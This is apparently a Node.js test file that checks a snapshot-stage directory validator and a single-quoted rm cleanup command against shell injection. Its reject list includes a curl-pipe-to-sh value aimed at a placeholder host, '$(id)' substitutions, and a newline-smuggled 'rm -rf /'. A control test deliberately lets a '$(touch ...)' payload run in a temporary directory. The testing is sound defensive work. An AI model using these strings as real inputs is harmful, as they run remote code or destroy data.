// scripts/snapshot-stage.test.mjs — `DSH_SNAPSHOT_STAGE` 的地板与清场引号（issue #1602）。
//
// 为什么判据必须**真跑 bash**：缺陷的两种形态（删错目录 / 注入执行）都发生在
// `wsl()` → `sh()` → `bash -lc` 这一层，纯字符串断言证明不了「这条命令真的不会执行 `$(...)`」。
// 所以每条用例都在临时目录里造一个**同名探针目录**，把真实命令跑出去，再看探针还在不在、
// 以及探针里的 payload 有没有被执行。
//
// 平台：Linux（CI）原生 bash；Windows 本地走 `wsl.exe -e bash -lc`（与 sh() 同一通道）。
// 两处都拿不到 bash 时**明确 skip 并说明**，不伪装成通过。
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { STAGE_ALLOWED_ROOTS, stageOverrideError, stageRemovalCommand } from './lib/snapshot-stage.mjs'
import { shellQuote } from './lib/shell.mjs'

const IS_WIN = process.platform === 'win32'
const BASH = IS_WIN
  ? (() => {
    const probe = spawnSync('wsl.exe', ['-e', 'bash', '-lc', 'echo ok'], { encoding: 'utf8' })
    return probe.status === 0 ? 'wsl' : null
  })()
  : (existsSync('/bin/bash') ? 'native' : null)
const NO_BASH = BASH === null ? '本机没有可用的 bash（Linux /bin/bash 或 wsl.exe），本条不跑' : false

/** 在 bash 里跑一条命令（可选工作目录）；返回 stdout（stderr 合并）。 */
function bash(command, cwd) {
  const oneLine = cwd === undefined ? command : 'cd ' + shellQuote(cwd) + ' && ' + command
  const args = BASH === 'wsl' ? ['-e', 'bash', '-lc', oneLine] : ['-lc', oneLine]
  const r = spawnSync(BASH === 'wsl' ? 'wsl.exe' : 'bash', args, { encoding: 'utf8' })
  return { status: r.status, out: (r.stdout ?? '') + (r.stderr ?? '') }
}

/** Windows 盘符路径 -> WSL 侧 /mnt 路径（清场命令吃的是 Linux 路径）。 */
const linuxPath = (p) => (IS_WIN ? p.replace(/\\/g, '/').replace(/^([A-Za-z]):/, (_, d) => '/mnt/' + d.toLowerCase()) : p)

test('地板：家目录 / 公共目录 / 注入形态一律拒绝（负控：任何一条被放行都是 rm -rf 打偏）', () => {
  const rejected = [
    '/root', '/home', '/home/u', '/data', '/tmp', '/', '/usr/local',
    '/root/.dsh-stage', '/root/.dsh-stage/', '/root//.dsh-stage/x86_64',
    '/root/.dsh-stage/../..', '/root/.dsh-stage/./x86_64',
    '/tmp/$(curl -s http://x/i|sh)', '/root/.dsh-stage/$(id)', '/root/.dsh-stage/`id`',
    '/root/.dsh-stage/x86_64\nrm -rf /', 'relative/.dsh-stage/x86_64', '', '   ',
  ]
  for (const value of rejected) {
    const why = stageOverrideError(value)
    assert.notEqual(why, null, '必须拒绝：' + JSON.stringify(value))
  }
})

test('地板：默认工作区形态（<root>/…/.dsh-stage/<abi>）必须放行', () => {
  for (const root of STAGE_ALLOWED_ROOTS) {
    assert.equal(stageOverrideError(root + '/.dsh-stage/x86_64'), null, root)
    assert.equal(stageOverrideError(root + '/user/.dsh-stage/arm64'), null, root + ' 多层前缀')
  }
  // 实测默认值形态（HOME=/root 时的 STAGE_DEFAULT_LINUX）
  assert.equal(stageOverrideError('/root/.dsh-stage/arm64'), null)
})

test('负控：旧判据（startsWith("/")）确实放行 /root 与注入形态（证明地板有判别力）', () => {
  const legacy = (v) => typeof v === 'string' && v.startsWith('/')
  for (const v of ['/root', '/home', '/tmp/$(curl -s http://x/i|sh)']) {
    assert.equal(legacy(v), true, '旧判据本应放行：' + v)
    assert.notEqual(stageOverrideError(v), null, '新地板必须拒绝旧判据放行的值：' + v)
  }
})

test('清场命令是单引号：注入形态原样落到 rm，绝不执行 payload', { skip: NO_BASH }, () => {
  const dir = mkdtempSync(join(tmpdir(), 'stage-quote-'))
  // 目录名就是注入形态；探针落在**被删树之外**，否则它会被同一条 rm 一起删掉（假绿）。
  const payload = join(tmpdir(), 'stage-pwned-' + String(Date.now()) + '-' + Math.random().toString(36).slice(2))
  const victim = join(dir, '$(touch ' + linuxPath(payload) + ')')
  try {
    mkdirSync(victim, { recursive: true })
    const r = bash(stageRemovalCommand(linuxPath(victim)))
    assert.equal(r.status, 0, r.out)
    assert.equal(existsSync(payload), false, '注入 payload 被执行了：' + r.out)
    assert.equal(existsSync(victim), false, '清场没落到目标目录上（引号把路径改写了）')
  } finally {
    rmSync(dir, { recursive: true, force: true })
    rmSync(payload, { force: true })
  }
})

test('清场命令是真的删：单引号路径与普通路径行为一致（不是把 rm 变成空操作）', { skip: NO_BASH }, () => {
  const dir = mkdtempSync(join(tmpdir(), 'stage-rm-'))
  const plain = join(dir, 'plain')
  const spaced = join(dir, "has space and 'quote'")
  try {
    for (const p of [plain, spaced]) {
      mkdirSync(join(p, 'root', 'usr'), { recursive: true })
      writeFileSync(join(p, 'root', 'usr', 'marker'), 'x')
      const r = bash(stageRemovalCommand(linuxPath(p)))
      assert.equal(r.status, 0, r.out)
      assert.equal(existsSync(p), false, '清场没有删掉：' + p)
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('负控：双引号形态确实会被 bash 展开（证明上一条不是空判据）', { skip: NO_BASH }, () => {
  // 这条**故意**复刻旧实现，用来证明「单引号」那一条有判别力：
  // 若哪天 shellQuote 退化成双引号，上面的注入用例会红；而这条会绿——两者互为对照。
  const dir = mkdtempSync(join(tmpdir(), 'stage-quote-ctl-'))
  const payload = join(tmpdir(), 'stage-pwned-ctl-' + String(Date.now()) + '-' + Math.random().toString(36).slice(2))
  const victim = join(dir, '$(touch ' + linuxPath(payload) + ')')
  try {
    mkdirSync(victim, { recursive: true })
    const r = bash('rm -rf "' + linuxPath(victim) + '"')
    assert.equal(r.status, 0, r.out)
    assert.equal(existsSync(payload), true, '双引号形态本应展开 payload —— 判据环境异常')
  } finally {
    rmSync(dir, { recursive: true, force: true })
    rmSync(payload, { force: true })
  }
})

test('stageRemovalCommand 只吃 Linux 绝对路径（相对路径直接拒绝，不猜）', () => {
  assert.throws(() => stageRemovalCommand('relative/path'))
  assert.throws(() => stageRemovalCommand(''))
})
